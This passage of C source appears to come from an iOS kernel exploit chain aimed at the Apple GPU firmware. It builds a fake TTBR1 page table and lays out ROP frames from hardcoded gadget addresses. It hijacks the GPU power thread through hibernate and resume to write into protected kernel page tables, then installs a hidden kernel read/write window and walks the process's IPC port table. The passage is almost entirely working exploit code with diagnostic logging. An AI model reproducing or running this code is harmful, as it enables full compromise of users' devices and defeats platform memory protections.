    if (free_slot < 0) { kwlog("[ttbr1] FAIL: no free L1 slot in [2..7] (all occupied)\n");
        if (root_mapped) ppl_writable_page_free(&rootpg); return -2; }
    kwlog("[ttbr1] first FREE L1 slot = %d -> self-ref window S = 0x%llx\n",
          free_slot, (unsigned long long)(T1BASE + ((uint64_t)free_slot << 36)));

    uint64_t learned_attr = 0, sample_leaf = 0, sva = g_agx_fw.zero_kva;
    if (sva > T1BASE) {
        uint64_t off = sva - T1BASE; int i1 = (int)((off >> 36) & 7);
        uint64_t i2 = (off >> 25) & 0x7FF, i3 = (off >> 14) & 0x7FF, l1e = L1[i1];
        if ((l1e & 3) == 3) {
            uint64_t l2kva = pte_scan_for_physaddr(l1e & OA), l2e = 0;
            if (l2kva && agx_kr64_dg(l2kva + 8*i2, &l2e) == 0 && (l2e & 3) == 3) {
                uint64_t l3kva = pte_scan_for_physaddr(l2e & OA), l3e = 0;
                if (l3kva && agx_kr64_dg(l3kva + 8*i3, &l3e) == 0 && (l3e & 1)) {
                    sample_leaf = l3e; learned_attr = l3e & 0xFFF0000000000FFFULL;
                }
            }
        }
        kwlog("[ttbr1] sample walk zero_kva=0x%llx L1[%d]/L2[%llu]/L3[%llu] leaf=0x%llx attr=0x%llx\n",
              (unsigned long long)sva, i1, (unsigned long long)i2, (unsigned long long)i3,
              (unsigned long long)sample_leaf, (unsigned long long)learned_attr);
    }
    uint64_t leaf_attr = learned_attr ? learned_attr : 0x747ULL;
    kwlog("[ttbr1] leaf attr to use = 0x%llx (%s)\n", (unsigned long long)leaf_attr,
          learned_attr ? "LEARNED from a live RW-data leaf" : "FALLBACK 0x747");

    ppl_page_t l1map, l2map, l3map;
    memset(&l1map, 0, sizeof(l1map)); memset(&l2map, 0, sizeof(l2map)); memset(&l3map, 0, sizeof(l3map));
    uint64_t L1pa = agx_alloc_table_page("fake_L1", &l1map);
    if (!L1pa) { if (root_mapped) ppl_writable_page_free(&rootpg); return -3; }
    uint64_t L2pa = agx_alloc_table_page("scratch_L2", &l2map);
    if (!L2pa) { ppl_writable_page_free(&l1map); if (root_mapped) ppl_writable_page_free(&rootpg); return -3; }
    uint64_t L3pa = agx_alloc_table_page("scratch_L3", &l3map);
    if (!L3pa) { ppl_writable_page_free(&l1map); ppl_writable_page_free(&l2map); if (root_mapped) ppl_writable_page_free(&rootpg); return -3; }
    uint64_t wpa = witness_pa ? witness_pa : L1pa;
    if (wpa >= 0x1000000000ULL) { kwlog("[ttbr1] FAIL: witness PA 0x%llx >= IPS36 limit\n", (unsigned long long)wpa);
        ppl_writable_page_free(&l1map); ppl_writable_page_free(&l2map); ppl_writable_page_free(&l3map);
        if (root_mapped) ppl_writable_page_free(&rootpg); return -4; }

    volatile uint64_t *fl1 = (volatile uint64_t *)(uintptr_t)l1map.mapped_addr;
    volatile uint64_t *fl2 = (volatile uint64_t *)(uintptr_t)l2map.mapped_addr;
    volatile uint64_t *fl3 = (volatile uint64_t *)(uintptr_t)l3map.mapped_addr;
    for (int i = 0; i < 8; i++) fl1[i] = L1[i];
    fl1[free_slot] = (L2pa & OA) | 0x3ULL;
    fl2[0]         = (L3pa & OA) | 0x3ULL;
    fl3[0]         = (wpa  & OA) | leaf_attr;
    __asm__ volatile("dsb ish" ::: "memory");

    uint64_t e1 = fl1[free_slot], e2 = fl2[0], e3 = fl3[0];
    uint64_t S = T1BASE + ((uint64_t)free_slot << 36);
    int branch_ok = ((e1 & OA) == (L2pa & OA)) && ((e1 & 3) == 3) &&
                    ((e2 & OA) == (L3pa & OA)) && ((e2 & 3) == 3) &&
                    ((e3 & OA) == (wpa  & OA)) && ((e3 & 1) == 1);
    int clone_ok = 1; for (int i = 0; i < 8; i++) { if (i == free_slot) continue; if (fl1[i] != L1[i]) clone_ok = 0; }
    kwlog("[ttbr1] VERIFY branch: fake_L1[%d]=0x%llx(->L2 0x%llx %s) L2[0]=0x%llx(->L3 0x%llx %s) L3[0]=0x%llx(->PA 0x%llx attr 0x%llx) -> %s\n",
          free_slot, (unsigned long long)e1, (unsigned long long)(e1 & OA), ((e1 & 3) == 3) ? "table" : "BAD",
          (unsigned long long)e2, (unsigned long long)(e2 & OA), ((e2 & 3) == 3) ? "table" : "BAD",
          (unsigned long long)e3, (unsigned long long)(e3 & OA), (unsigned long long)(e3 & 0xFFF0000000000FFFULL),
          branch_ok ? "OK" : "MISMATCH");
    kwlog("[ttbr1] VERIFY clone: L1[0..7] (except injected slot %d) byte-match = %d branch_ok=%d\n", free_slot, clone_ok, branch_ok);
    s_fake_ttbr1_pa = L1pa; s_self_ref_S = S; s_leaf_attr = leaf_attr;
    kwlog("[ttbr1] fake-TTBR1: fake_TTBR1 = PA 0x%llx | self-ref window S = 0x%llx | leaf attr 0x%llx | witness PA 0x%llx\n",
          (unsigned long long)L1pa, (unsigned long long)S, (unsigned long long)leaf_attr, (unsigned long long)wpa);
    kwlog("[ttbr1] (deliver: hibernate -> str 0x%llx into dump+0x108(0x69358) -> trigger -> resume -> str through S|(target&0x3FFF) -> restore power thread.)\n",
          (unsigned long long)L1pa);
    if (root_mapped) ppl_writable_page_free(&rootpg);
    return 0;
}

#pragma mark - deliver: sp-ROP frames + the broad-write delivery -- CUSTOM

static void agx_rop_frame(volatile uint8_t *f, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t elr, uint64_t x30) {
    *(volatile uint64_t *)(f + 0x00) = x0;  *(volatile uint64_t *)(f + 0x08) = x1;  *(volatile uint64_t *)(f + 0x10) = x2;
    *(volatile uint64_t *)(f + 0xf0) = x30; *(volatile uint64_t *)(f + 0x100) = elr;
    *(volatile uint64_t *)(f + 0x108) = 0x4ULL; *(volatile uint64_t *)(f + 0x110) = 0x300000ULL;
}

static int find_real_kernel_pt_page(uint64_t, uint64_t *, uint64_t *, uint64_t *);

static uint64_t s2d_read_witness(volatile uint64_t *kobj_user, uint64_t pt_kva, uint64_t off) {
    if (kobj_user) { __asm__ volatile("dc civac, %0\n\tdmb ish":: "r"(kobj_user):"memory"); return *kobj_user; }
    uint64_t v = 0; kread_qword(pt_kva + off, &v); return v;
}

#ifndef AGX_STAGE2D_FULL
#define AGX_STAGE2D_FULL 1
#endif
static struct { int installed; uint64_t l3_kva; uint64_t window_va; uint64_t rw_attr; int next_slot;
                uint64_t l1_pa; uint64_t free_off; uint64_t l1tab_kva; uint64_t hook_val;  } g_sptm_window = {0};
static void agx_deliver(uint64_t ch, uint64_t ptr_ring, uint64_t ctrl, uint32_t size) {
    (void)ch;
    const uint64_t G_STR=0xffffff800000073cULL, G_DSBISB=0xffffff8000000704ULL, G_SPIN=0xffffff8000005810ULL;
    const uint64_t G_NEXT=0xffffff8000005758ULL, G_HIB=0xffffff800000624cULL, HBCTX=0xffffff8000069250ULL;
    const uint64_t G_RESUME=0xffffff8000005460ULL;
    const uint64_t D_RPC=HBCTX+0x00, D_SP=HBCTX+0xC8, D_TTBR1=HBCTX+0x108;
    const uint64_t L2C=0xffffff9100160008ULL, DBGOV=0xffffff9100170000ULL, TRIG=0xFFFFFFFF80000000ULL;
    const uint64_t SENTINEL_A=0xC0DEC0DEC0DEC0DEULL, SENTINEL_POST=0xAB1EAB1EAB1EAB1EULL, SENTINEL_W=0xB10ADB10ADB10AD1ULL;
    if (!g_agx_fw.zero_kva || !g_agx_fw.zero_wp_mapped_va) { kwlog("[deliver] no zero_wp scratch\n"); return; }

    uint64_t pt_field = g_agx_fw.v43, orig_ctx = 0;
    if (!pt_field || kread_ptr_by_firmware_vaddr(pt_field, &orig_ctx) != 0 || !orig_ctx) {
        kwlog("[deliver] ABORT: *(power_thread+0x48) unreadable (v43=0x%llx orig=0x%llx)\n",
              (unsigned long long)pt_field, (unsigned long long)orig_ctx); return; }

    {
        uint64_t ox0=0,ox1=0,ox19=0,ox20=0,ox29=0,ox30=0,osp=0,opc=0,ospsr=0,ocpacr=0;
        kread_ptr_by_firmware_vaddr(orig_ctx+0x00,&ox0);  kread_ptr_by_firmware_vaddr(orig_ctx+0x08,&ox1);
        kread_ptr_by_firmware_vaddr(orig_ctx+0x98,&ox19); kread_ptr_by_firmware_vaddr(orig_ctx+0xa0,&ox20);
        kread_ptr_by_firmware_vaddr(orig_ctx+0xe8,&ox29); kread_ptr_by_firmware_vaddr(orig_ctx+0xf0,&ox30);
        kread_ptr_by_firmware_vaddr(orig_ctx+0xf8,&osp);  kread_ptr_by_firmware_vaddr(orig_ctx+0x100,&opc);
        kread_ptr_by_firmware_vaddr(orig_ctx+0x108,&ospsr); kread_ptr_by_firmware_vaddr(orig_ctx+0x110,&ocpacr);
        kwlog("[deliver] orig=0x%llx power-thread saved ctx: PC=0x%llx SP_EL0=0x%llx SPSR=0x%llx CPACR=0x%llx\n",
              (unsigned long long)orig_ctx,(unsigned long long)opc,(unsigned long long)osp,(unsigned long long)ospsr,(unsigned long long)ocpacr);
        kwlog("[deliver]   x0=0x%llx(==0?%d -> resume_uat-tail x0=0 %s) x1=0x%llx x19=0x%llx x20=0x%llx x29=0x%llx x30=0x%llx\n",
              (unsigned long long)ox0,(ox0==0),(ox0==0)?"FAITHFUL":"MISMATCH-check",
              (unsigned long long)ox1,(unsigned long long)ox19,(unsigned long long)ox20,(unsigned long long)ox29,(unsigned long long)ox30);
    }

    uint64_t target_pa = 0, write_off = 0, pt_kva = 0, witness_kva = 0; const char *tgt_kind;
    uint64_t write_value = SENTINEL_W;
    uint64_t hook_window_va = 0, hook_verify_kva = 0;
    ppl_page_t tmap; memset(&tmap, 0, sizeof(tmap));
    volatile uint64_t *kobj_user = NULL;
#if AGX_STAGE2D_FULL
    { uint32_t gs = 0; mach_port_t wp = 0;
      witness_kva = kern_port_kobj_find_impl((uint32_t)vm_page_size, &gs, &wp);
      if (!witness_kva) { kwlog("[deliver] ABORT: witness kobj alloc\n"); return; }
      uint64_t pt_pa = 0, safe_off = 0;
      int frc = find_real_kernel_pt_page(witness_kva, &pt_pa, &safe_off, &pt_kva);
      if (frc) { kwlog("[deliver] ABORT: find_real_kernel_pt_page rc=%d\n", frc); return; }
      if (pt_pa >= 0x1000000000ULL) { kwlog("[deliver] ABORT: PT-page PA 0x%llx >= IPS36 limit\n", (unsigned long long)pt_pa); return; }
      target_pa = pt_pa; write_off = safe_off; tgt_kind = "REAL XNU_PAGE_TABLE page (SPTM-protected)";
      kwlog("[deliver] FULL target = %s: pa=0x%llx kva=0x%llx safe_off=0x%llx\n",
            tgt_kind, (unsigned long long)pt_pa, (unsigned long long)pt_kva, (unsigned long long)safe_off);
      { uint32_t g2=0; mach_port_t p2=0;
        uint64_t rwl=0; if (kernel_pte_walk_full(witness_kva & ~0x3FFFULL, NULL, &rwl, NULL) || !rwl) { kwlog("[deliver] ABORT: witness leaf attr\n"); return; }
        uint64_t rw_attr = rwl & ~0xFFFFFFFFC000ULL;
        uint64_t cl3_kva = kern_port_kobj_find_impl((uint32_t)vm_page_size, &g2, &p2);
        if (!cl3_kva) { kwlog("[deliver] ABORT: hook_L3 alloc\n"); return; }
        uint64_t cl3_pte=0; if (kernel_pte_walk_full(cl3_kva & ~0x3FFFULL, NULL, &cl3_pte, NULL) || !(cl3_pte & 0xFFFFFFFFC000ULL)) { kwlog("[deliver] ABORT: hook_L3 walk\n"); return; }
        uint64_t cl3_pa = cl3_pte & 0xFFFFFFFFC000ULL;
        uint64_t bt_kva = kern_port_kobj_find_impl((uint32_t)vm_page_size, &g2, &p2);
        if (!bt_kva) { kwlog("[deliver] ABORT: benign target alloc\n"); return; }
        uint64_t bt_pa=0; if (kernel_pte_walk_full(bt_kva & ~0x3FFFULL, NULL, NULL, &bt_pa) || !bt_pa) { kwlog("[deliver] ABORT: benign target pa\n"); return; }
        bt_pa &= ~0x3FFFULL;
        uint64_t leaf0 = (bt_pa & 0xFFFFFFFFC000ULL) | rw_attr;
        if (kwrite_via_necp_object(cl3_kva, &leaf0, 8, 1)) { kwlog("[deliver] ABORT: write hook_L3[0]\n"); return; }
        uint64_t l1_pa=0, free_off=0, window_va=0, l1tab=0;
        int hr = find_free_kernel_l2_slot(witness_kva, &l1_pa, &free_off, &window_va, &l1tab);
        if (hr) { kwlog("[deliver] ABORT: find_free_kernel_l2_slot rc=%d\n", hr); return; }
        if (l1_pa >= 0x1000000000ULL) { kwlog("[deliver] ABORT: L1-table PA 0x%llx >= IPS36\n",(unsigned long long)l1_pa); return; }
        target_pa = l1_pa; write_off = free_off; pt_kva = l1tab;
        write_value = (cl3_pa & 0xFFFFFFFFC000ULL) | rw_attr;
        hook_window_va = window_va; hook_verify_kva = bt_kva & ~0x3FFFULL; tgt_kind = "HOOK real-L1[free] -> hook_L3 (B)";
        kwlog("[deliver] hook_L3 kva=0x%llx pa=0x%llx [0]->benign(kva=0x%llx pa=0x%llx) | HOOK: real_L1 pa=0x%llx +0x%llx = 0x%llx | window_VA=0x%llx rw_attr=0x%llx\n",
              (unsigned long long)cl3_kva,(unsigned long long)cl3_pa,(unsigned long long)bt_kva,(unsigned long long)bt_pa,
              (unsigned long long)l1_pa,(unsigned long long)free_off,(unsigned long long)write_value,(unsigned long long)window_va,(unsigned long long)rw_attr);
        g_sptm_window.l3_kva = cl3_kva; g_sptm_window.window_va = window_va; g_sptm_window.rw_attr = rw_attr;
        g_sptm_window.next_slot = 1;
        g_sptm_window.l1_pa = l1_pa; g_sptm_window.free_off = free_off; g_sptm_window.l1tab_kva = l1tab; g_sptm_window.hook_val = write_value;
        }
      }
#else
    target_pa = agx_alloc_table_page("benign_target", &tmap);
    if (!target_pa) { kwlog("[deliver] ABORT: target alloc\n"); return; }
    write_off = 0; kobj_user = (volatile uint64_t *)(uintptr_t)tmap.mapped_addr; tgt_kind = "benign kobj (UNPROTECTED)";
#endif

    if (agx_build_fake_ttbr1(target_pa + write_off) != 0) {
        kwlog("[deliver] ABORT: fake TTBR1 build failed\n"); if (kobj_user) ppl_writable_page_free(&tmap); return; }
    uint64_t fake_ttbr1 = s_fake_ttbr1_pa, S = s_self_ref_S, write_va = S | (write_off & 0x3FFFULL);
    uint64_t pre_w = s2d_read_witness(kobj_user, pt_kva, write_off);

    const uint64_t FC_OFF=0x400, ROP_OFF=0x800, SCRA_OFF=0x1F40, SCRP_OFF=0x1F48, POST_OFF=0x2000;
    uint64_t fc_gpuva=g_agx_fw.zero_kva+FC_OFF, rop_sp=g_agx_fw.zero_kva+ROP_OFF, post_sp=g_agx_fw.zero_kva+POST_OFF;
    uint64_t scratchA_gpuva=g_agx_fw.zero_kva+SCRA_OFF, scratchPOST_gpuva=g_agx_fw.zero_kva+SCRP_OFF;
    volatile uint8_t  *fc =(volatile uint8_t *)(uintptr_t)(g_agx_fw.zero_wp_mapped_va+FC_OFF);
    volatile uint8_t  *rb =(volatile uint8_t *)(uintptr_t)(g_agx_fw.zero_wp_mapped_va+ROP_OFF);
    volatile uint8_t  *pb =(volatile uint8_t *)(uintptr_t)(g_agx_fw.zero_wp_mapped_va+POST_OFF);
    volatile uint64_t *scratchA   =(volatile uint64_t *)(uintptr_t)(g_agx_fw.zero_wp_mapped_va+SCRA_OFF);
    volatile uint64_t *scratchPOST=(volatile uint64_t *)(uintptr_t)(g_agx_fw.zero_wp_mapped_va+SCRP_OFF);
    *scratchA=0; *scratchPOST=0;
    for (int i=0;i<0x350;i++)   fc[i]=0;
    for (int i=0;i<0x350*7;i++) rb[i]=0;
    for (int i=0;i<0x350*4;i++) pb[i]=0;

    agx_rop_frame(fc, scratchA_gpuva, SENTINEL_A, 0, G_STR, G_NEXT);
    *(volatile uint64_t *)(fc+0xa0)=1;
    *(volatile uint64_t *)(fc+0xe8)=0x7777777777777700ULL;
    *(volatile uint64_t *)(fc+0xf8)=rop_sp;

    agx_rop_frame(rb+0*0x350, HBCTX,   0,          0, G_HIB,    G_NEXT);
    agx_rop_frame(rb+1*0x350, D_TTBR1, fake_ttbr1, 0, G_STR,    G_NEXT);
    agx_rop_frame(rb+2*0x350, D_RPC,   G_NEXT,    0, G_STR,    G_NEXT);
    agx_rop_frame(rb+3*0x350, D_SP,    post_sp,    0, G_STR,    G_NEXT);
    agx_rop_frame(rb+4*0x350, L2C,     0,          0, G_STR,    G_NEXT);
    agx_rop_frame(rb+5*0x350, 0,       0,          0, G_DSBISB, G_NEXT);
    agx_rop_frame(rb+6*0x350, DBGOV,   TRIG,       0, G_STR,    G_SPIN);

    agx_rop_frame(pb+0*0x350, scratchPOST_gpuva, SENTINEL_POST, 0, G_STR, G_NEXT);
    agx_rop_frame(pb+1*0x350, write_va,          write_value,   0, G_STR, G_NEXT);
    agx_rop_frame(pb+2*0x350, pt_field,          orig_ctx,      0, G_STR, G_NEXT);
    {
        volatile uint8_t *p3 = pb + 3*0x350;
        *(volatile uint64_t *)(p3+0x00)=0;
        *(volatile uint64_t *)(p3+0x08)=orig_ctx;
        *(volatile uint64_t *)(p3+0x10)=0;
        *(volatile uint64_t *)(p3+0xf0)=G_SPIN;
        *(volatile uint64_t *)(p3+0x100)=G_RESUME;
        *(volatile uint64_t *)(p3+0x108)=0x3c5ULL;
        *(volatile uint64_t *)(p3+0x110)=0x300000ULL;
    }
    __asm__ volatile("dsb ish" ::: "memory");

    kwlog("[deliver] === (%s): hibernate -> swap fake_TTBR1=0x%llx -> trigger -> resume -> write SENTINEL_W to PA 0x%llx via VA 0x%llx -> restore pt -> FAITHFUL-RESUME power thread (eret 0x5460@EL1h, x1=orig=0x%llx) ===\n",
          tgt_kind, (unsigned long long)fake_ttbr1, (unsigned long long)(target_pa + write_off), (unsigned long long)write_va, (unsigned long long)orig_ctx);
    kwlog("[deliver] fc@0x%llx ROP@0x%llx POST@0x%llx | orig_ctx=0x%llx pt_field=0x%llx | target(pre)=0x%llx | S=0x%llx\n",
          (unsigned long long)fc_gpuva,(unsigned long long)rop_sp,(unsigned long long)post_sp,
          (unsigned long long)orig_ctx,(unsigned long long)pt_field,(unsigned long long)pre_w,(unsigned long long)S);

    int landed=0, arms=0;
    for (int a=0; a<200 && !landed; a++) {
        if (agx_op0f_arm(ptr_ring, ctrl, size, pt_field, fc_gpuva)) arms++;
        uint64_t v=0; if (kread_ptr_by_firmware_vaddr(pt_field,&v)==0 && v==fc_gpuva) { landed=1;
            kwlog("[deliver] redirect LANDED (arm %d, %d injected): *(power_thread+0x48)=0x%llx\n", a, arms, (unsigned long long)v); } }
    if (!landed) { uint64_t v=0; kread_ptr_by_firmware_vaddr(pt_field,&v);
        kwlog("[deliver] redirect did NOT land after 200 arms (%d injected, last=0x%llx).\n", arms, (unsigned long long)v);
        if (kobj_user) ppl_writable_page_free(&tmap); return; }

    const int S2D_IDLE_GAP_MS = 300;
    const int S2D_MAX_CYCLES  = 150;
    agx_render_keepalive_stop();
    (void)agx_metal_setup();
    kwlog("[deliver] redirect in place; CADisplayLink quiesced + continuous keepalive stopped -> PULSED active<->idle poll for target==SENTINEL_W (<=%d cycles, %dms idle gap each).\n",
          S2D_MAX_CYCLES, S2D_IDLE_GAP_MS);
    int won=0, cycles=0;
    for (cycles=0; cycles<S2D_MAX_CYCLES && !won; cycles++) {
        if (s2d_read_witness(kobj_user, pt_kva, write_off) == write_value) { won=1; break; }
        @autoreleasepool { agx_metal_blits(1); }
        for (int s=0; s < S2D_IDLE_GAP_MS/10 && !won; s++) {
            if (s2d_read_witness(kobj_user, pt_kva, write_off) == write_value) { won=1; break; }
            usleep(10000);
        }
        if ((cycles%10)==9) {
            __asm__ volatile("dc civac, %0\n\tdmb ish":: "r"(scratchA):"memory");
            __asm__ volatile("dc civac, %0\n\tdmb ish":: "r"(scratchPOST):"memory");
            kwlog("[deliver] ...pulse-poll cycle %d (~%ds): scratchA=0x%llx scratchPOST=0x%llx target=0x%llx\n",
                  cycles,cycles*(S2D_IDLE_GAP_MS+10)/1000,(unsigned long long)*scratchA,(unsigned long long)*scratchPOST,
                  (unsigned long long)s2d_read_witness(kobj_user,pt_kva,write_off));
        }
    }
    __asm__ volatile("dc civac, %0\n\tdmb ish":: "r"(scratchA):"memory");
    __asm__ volatile("dc civac, %0\n\tdmb ish":: "r"(scratchPOST):"memory");
    uint64_t tgt_final = s2d_read_witness(kobj_user, pt_kva, write_off);
    uint64_t d_rpc=0,d_ttbr1=0,d_ttbr0=0,d_tcr=0;
    kread_ptr_by_firmware_vaddr(D_RPC,&d_rpc); kread_ptr_by_firmware_vaddr(D_TTBR1,&d_ttbr1);
    kread_ptr_by_firmware_vaddr(HBCTX+0x100,&d_ttbr0); kread_ptr_by_firmware_vaddr(HBCTX+0xF0,&d_tcr);
    { uint64_t hb_spel1=0, hb_spel0=0, hb_tpidrro=0;
      kread_ptr_by_firmware_vaddr(HBCTX+0xD0,&hb_spel1); kread_ptr_by_firmware_vaddr(HBCTX+0xC8,&hb_spel0);
      kread_ptr_by_firmware_vaddr(HBCTX+0xD8,&hb_tpidrro);
      kwlog("[deliver] hibernate dump SPs: SP_EL1@0x69320=0x%llx SP_EL0@0x69318=0x%llx(=POST_SP) TPIDRRO@0x69328=0x%llx(=fc_gpuva)\n",
            (unsigned long long)hb_spel1,(unsigned long long)hb_spel0,(unsigned long long)hb_tpidrro); }
    if (won) {
        kwlog("[deliver] deliver (%s): PA 0x%llx == SENTINEL_W%s (scratchA=0x%llx==A?%d scratchPOST=0x%llx==POST?%d)\n",
              tgt_kind,(unsigned long long)(target_pa+write_off),
              AGX_STAGE2D_FULL ? " on an XNU_PAGE_TABLE page" : "",
              (unsigned long long)*scratchA,(*scratchA==SENTINEL_A),(unsigned long long)*scratchPOST,(*scratchPOST==SENTINEL_POST));
        kwlog("[deliver] dump@0x69250: resume-PC=0x%llx(F3->0x5758) TTBR1=0x%llx(F2->0x%llx) TTBR0=0x%llx TCR=0x%llx | target read-back=0x%llx\n",
              (unsigned long long)d_rpc,(unsigned long long)d_ttbr1,(unsigned long long)fake_ttbr1,(unsigned long long)d_ttbr0,(unsigned long long)d_tcr,(unsigned long long)tgt_final);
        kwlog("[deliver] FAITHFUL RESUME armed (P3 eret 0x5460@EL1h -> fw restores the power thread from orig).\n");
        if (hook_window_va && hook_verify_kva) {
            uint64_t wv=0, bv=0; int r1=kread_qword(hook_window_va,&wv); int r2=kread_qword(hook_verify_kva,&bv);
            int read_live = (r1==0 && r2==0 && wv==bv);
            kwlog("[deliver] window_VA=0x%llx -> kread=0x%llx(rc=%d) ; benign kva=0x%llx -> 0x%llx(rc=%d) -> window READ %s\n",
                  (unsigned long long)hook_window_va,(unsigned long long)wv,r1,(unsigned long long)hook_verify_kva,(unsigned long long)bv,r2,
                  read_live ? "LIVE" : "FAILED");
            if (read_live) {
                uint64_t S2 = 0xB0B0CAFEB0B0CAFEULL;
                int wr = kwrite_via_necp_object(hook_window_va, &S2, 8, 1);
                uint64_t back=0; int rb = kread_qword(hook_verify_kva, &back);
                int ok = (rb==0 && back==S2);
                if (ok) g_sptm_window.installed = 1;
                kwlog("[deliver] window WRITE: kwrite(window_VA)=0x%llx via necp rc=%d -> benign reads 0x%llx(rc=%d) -> %s\n",
                      (unsigned long long)S2,wr,(unsigned long long)back,rb,
                      ok ? "landed (g_sptm_window.installed=1)" : "did NOT land");
            }
        }
    } else {
        kwlog("[deliver] NO SENTINEL_W (%s). scratchA=0x%llx(==A?%d) scratchPOST=0x%llx(==POST?%d) target=0x%llx | dump@0x69250: resume-PC=0x%llx TTBR1=0x%llx(want 0x%llx) TTBR0=0x%llx TCR=0x%llx\n",
              tgt_kind,(unsigned long long)*scratchA,(*scratchA==SENTINEL_A),(unsigned long long)*scratchPOST,(*scratchPOST==SENTINEL_POST),(unsigned long long)tgt_final,
              (unsigned long long)d_rpc,(unsigned long long)d_ttbr1,(unsigned long long)fake_ttbr1,(unsigned long long)d_ttbr0,(unsigned long long)d_tcr);
    }
}

#pragma mark - deliver: terminal-replace + live-channel discovery -- CUSTOM

static void agx_deliver_via_channel(uint64_t ch, uint64_t q_kva) {
    (void)q_kva;
    if (!agx_kva_ok(ch)) { kwlog("[deliver] ch invalid\n"); return; }
    if (!g_agx_fw.zero_kva || !g_agx_fw.zero_wp_mapped_va) { kwlog("[deliver] no zero_wp scratch\n"); return; }
    uint64_t ptr_ring=0, ctrl=0;
    agx_kr64_dg(ch+0x70,&ptr_ring); ptr_ring=AGX_KPTR_STRIP(ptr_ring);
    agx_kr64_dg(ch+0x68,&ctrl);     ctrl=AGX_KPTR_STRIP(ctrl);
    if (!agx_kva_ok(ptr_ring)||!agx_kva_ok(ctrl)) { kwlog("[deliver] ring/ctrl bad\n"); return; }
    uint64_t ts=0; agx_kr64_dg(ctrl+0x50,&ts); uint32_t size=(uint32_t)ts; if(!size||size>0x4000){ kwlog("[deliver] bad size=%u\n",size); return; }
    kwlog("[deliver] live channel resolved: ptr_ring=0x%llx ctrl=0x%llx size=%u -> op-0f delivery\n",
          (unsigned long long)ptr_ring,(unsigned long long)ctrl,size);
    agx_deliver(ch, ptr_ring, ctrl, size);
    return;
}

static void agx_deliver_run(io_connect_t conn, int probe_only) {
    if (!conn) { kwlog("[own] no conn\n"); return; }
    if (!probe_only && (!g_agx_fw.zero_kva || !g_agx_fw.zero_wp_mapped_va)) { kwlog("[own] no zero_wp scratch (resolve must run first)\n"); return; }
    if (!agx_metal_render_setup()) { kwlog("[own] render setup FAILED -- cannot serve own channel\n"); return; }
    kwlog("[own] mode=%s\n", probe_only ? "EARLY-PROBE (pre-bypass, NO publish)" : "FULL (post-resolve)");
    agx_metal_render(2);
    agx_render_keepalive_start();
    usleep(300000);
    kwlog("[own] === own-channel serve === continuous keepalive running (submits=%llu)\n",
          (unsigned long long)g_rr_submits);
    uint64_t our_task = kread_get_our_proc();
    uint64_t A1VT = 0xFFFFFFF0279232D0ULL + kwrite_get_kaslr_slide();
    if (!agx_kva_ok(our_task)) { kwlog("[own] our_task unresolved -- abort\n"); goto own_done; }
    uint64_t ipc_space=0, table_raw=0;
    agx_kr64(our_task+768,&ipc_space); ipc_space=AGX_KPTR_STRIP(ipc_space);
    if (agx_kva_ok(ipc_space)) agx_kr64(ipc_space+32,&table_raw);
    uint64_t table_base=(table_raw & 0xFFFFFFBFFFFFC000ULL)|0x4000000000ULL; table_base|=0xFFFFFF8000000000ULL;
    uint32_t entries=(((uint32_t)table_raw<<14)&0x0FFFC000u)/24;
    kwlog("[own] our_task=0x%llx ipc_space=0x%llx ipc_table=0x%llx entries=%u A1VT=0x%llx (sel7=0x%x)\n",
          (unsigned long long)our_task,(unsigned long long)ipc_space,(unsigned long long)table_base,entries,
          (unsigned long long)A1VT,g_agx_fw.s13_sel7_handle);
    if (!agx_kva_ok(table_base) || !entries || entries>0x40000) { kwlog("[own] our ipc table invalid -- abort\n"); goto own_done; }
    uint64_t want_vt = agx_conn_class_vtable(conn);
    kwlog("[own] want_vt(our leaf UC class)=0x%llx\n",(unsigned long long)want_vt);
    enum { MAXC = 64 };
    uint64_t cq_[MAXC], ch_[MAXC], s0_[MAXC]; uint32_t reg_[MAXC]; uint32_t choff_[MAXC]; int nc=0;
    uint64_t qall_[16]; uint32_t qallreg_[16]; int nqall=0;
    uint64_t seen_cont[24]; int nseen=0; uint64_t gpage=~0ULL;
    int n1d=0,nkobj=0,ndev=0,ncont=0,nlogp=0;
    for (uint32_t idx=1; idx<entries && nc<MAXC; idx++) {
        uint64_t entry=table_base+24ULL*idx; uint64_t pg=entry&~0x3FFFULL;
        if (pg!=gpage) { if (agx_pg_unsafe(pg)) break; gpage=pg; }
        uint64_t port=0; if (kread_qword(entry,&port)) continue; port=AGX_KPTR_STRIP(port); if(!agx_kva_ok(port)) continue;
        uint64_t ipbits=0; if (agx_kr64(port,&ipbits)) continue;
        if (!((uint32_t)ipbits & 0x80000000u)) continue;
        if (((uint32_t)ipbits & 0x3FFu) != 0x1Du) continue;
        n1d++;
        uint64_t kobj=0; if (agx_kr64(port+72,&kobj)||!agx_kva_ok(kobj)) continue; nkobj++;
        uint64_t dev=0; agx_kr64_dg(kobj+0x30,&dev); dev=AGX_KPTR_STRIP(dev); if(!agx_kva_ok(dev)) continue; ndev++;
        uint64_t leaf_vt=0; agx_kr64(dev,&leaf_vt); leaf_vt=AGX_KPTR_STRIP(leaf_vt);
        uint64_t cont=0; agx_kr64_dg(dev+0x120,&cont); cont=AGX_KPTR_STRIP(cont);
        int cont_ok=agx_kva_ok(cont); if(cont_ok) ncont++;
        if (nlogp<48) { kwlog("[own]  port[%u] kobj=0x%llx dev=0x%llx leaf_vt=0x%llx%s cont=0x%llx%s\n",
            idx,(unsigned long long)kobj,(unsigned long long)dev,(unsigned long long)leaf_vt,
            (leaf_vt==want_vt)?"(==want)":"",(unsigned long long)cont,cont_ok?"":"(BAD)"); nlogp++; }
        if (leaf_vt==want_vt) {
            char dl[420]; int dp=0; dp+=snprintf(dl+dp,sizeof(dl)-dp,"[own]   dev+0x110..130:");
            for(uint32_t o=0x110;o<=0x130;o+=8){ uint64_t v=0; agx_kr64_dg(dev+o,&v); dp+=snprintf(dl+dp,sizeof(dl)-dp," +%x=0x%llx",o,(unsigned long long)AGX_KPTR_STRIP(v)); }
            if(cont_ok){ dp+=snprintf(dl+dp,sizeof(dl)-dp," | cont+0x80..A8:");
                for(uint32_t o=0x80;o<=0xA8;o+=8){ uint64_t v=0; agx_kr64_dg(cont+o,&v); dp+=snprintf(dl+dp,sizeof(dl)-dp," +%x=0x%llx",o,(unsigned long long)AGX_KPTR_STRIP(v)); } }
            kwlog("%s\n",dl);
        }
        if (!cont_ok) continue;
        int dup=0; for(int s=0;s<nseen;s++) if(seen_cont[s]==cont){dup=1;break;} if(dup) continue;
        if(nseen<24) seen_cont[nseen++]=cont;
        static const uint32_t LTOFF[3] = {0x80, 0x88, 0x90};
        for (int lti=0; lti<3 && nc<MAXC; lti++) {
